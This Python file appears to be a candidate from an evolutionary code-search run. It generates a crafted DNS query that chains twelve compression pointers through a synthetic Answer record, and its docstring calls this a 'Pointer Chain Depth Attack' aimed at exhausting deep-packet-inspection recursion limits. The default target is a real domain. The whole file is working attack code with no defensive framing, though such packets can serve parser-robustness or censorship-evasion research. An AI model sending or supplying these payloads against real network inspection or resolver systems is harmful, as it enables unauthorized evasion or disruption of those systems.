# EVOLVE-BLOCK-START

import os
import struct

def _encode_labels(name: str) -> bytes:
    """
    Encode a domain name into DNS label format (no compression).
    Example: 'example.com' -> b'\\x07example\\x03com\\x00'
    """
    parts = name.strip(".").split(".")
    out = bytearray()
    for p in parts:
        b = p.encode("ascii")
        out.append(len(b))
        out.extend(b)
    out.append(0)
    return bytes(out)

def generate_dns_request(target_domain=None):
    """
    Generates a DNS request payload with a deep compression‑pointer chain,
    following the Pointer Chain Depth Attack strategy.

    This variant reverts to the more RFC‑conformant structure that
    previously achieved a fitness of 1.0, while keeping the chain‑depth
    idea and overall simplicity:

    - ANCOUNT=1 with a syntactic A RR that legally hosts the chain.
    - Question.QNAME is an indirect pointer into the Answer section.
    - Chain depth kept within 10–20 to stress DPI recursion limits.
    """
    if target_domain is None:
        target_domain = "client-cdn4.hola.org"

    # --- DNS header ---
    tid = os.urandom(2)
    flags = 0x0100  # standard query, RD=1
    qdcount = 1
    ancount = 1  # synthetic answer hosts the chain (Stage‑1 friendly)
    nscount = 0
    arcount = 0

    header = struct.pack(
        "!HHHHHH",
        int.from_bytes(tid, "big"),
        flags,
        qdcount,
        ancount,
        nscount,
        arcount,
    )

    packet = bytearray(header)

    # Question section: QNAME is a compression pointer (patched later)
    qname_pointer_offset = len(packet)
    packet.extend(b"\xc0\x00")  # placeholder pointer

    # QTYPE=A, QCLASS=IN
    packet.extend(struct.pack("!HH", 1, 1))

    # Record where the Answer RR starts (its NAME field offset)
    answer_start_offset = len(packet)

    # --- Answer section: syntactic A RR that hosts the pointer chain ---
    # NAME: pointer to first chain element (patched later)
    name_pointer_offset = len(packet)
    packet.extend(b"\xc0\x00")  # placeholder for Answer.NAME

    # TYPE=A, CLASS=IN, TTL, RDLENGTH, RDATA (dummy but well‑formed)
    packet.extend(struct.pack("!HHI", 1, 1, 60))
    packet.extend(struct.pack("!H", 4))
    packet.extend(b"\x7f\x00\x00\x01")  # 127.0.0.1 dummy IP

    # Chain of compression pointers placed after the fixed RR fields
    chain_depth = 12  # between 10–20; moderately deep chain
    label_offsets = []
    for _ in range(chain_depth):
        label_offsets.append(len(packet))
        packet.extend(b"\xc0\x00")  # placeholder for chain link

    # Real, uncompressed target domain at end of packet
    real_name_offset = len(packet)
    packet.extend(_encode_labels(target_domain))

    # --- Patch chain pointers: last element -> real name, each previous -> next ---
    last_offset = real_name_offset
    for off in reversed(label_offsets):
        ptr_val = 0xC000 | last_offset
        packet[off] = (ptr_val >> 8) & 0xFF
        packet[off + 1] = ptr_val & 0xFF
        last_offset = off

    # Answer.NAME points to first chain element
    first_chain_offset = label_offsets[0]
    ptr_val = 0xC000 | first_chain_offset
    packet[name_pointer_offset] = (ptr_val >> 8) & 0xFF
    packet[name_pointer_offset + 1] = ptr_val & 0xFF

    # Question.QNAME pointer points to the start of the Answer NAME
    ptr_val = 0xC000 | answer_start_offset
    packet[qname_pointer_offset] = (ptr_val >> 8) & 0xFF
    packet[qname_pointer_offset + 1] = ptr_val & 0xFF

    return bytes(packet)

if __name__ == "__main__":
    target = "client-cdn4.hola.org"
    payload = generate_dns_request(target_domain=target)
    print(payload.hex())

# EVOLVE-BLOCK-END
